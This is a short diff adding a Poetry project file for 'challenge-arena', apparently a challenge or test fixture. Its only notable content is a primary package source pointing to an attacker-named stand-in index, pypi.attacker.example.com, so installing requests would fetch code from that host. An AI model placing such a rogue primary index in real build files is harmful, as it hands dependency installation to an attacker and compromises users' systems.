@@ -1,0 +1,12 @@
+[tool.poetry]
+name = "challenge-arena"
+version = "1.0.0"
+
+[[tool.poetry.source]]
+name = "private"
+url = "https://pypi.attacker.example.com/simple"
+priority = "primary"
+
+[tool.poetry.dependencies]
+python = "^3.12"
+requests = "^2.31"
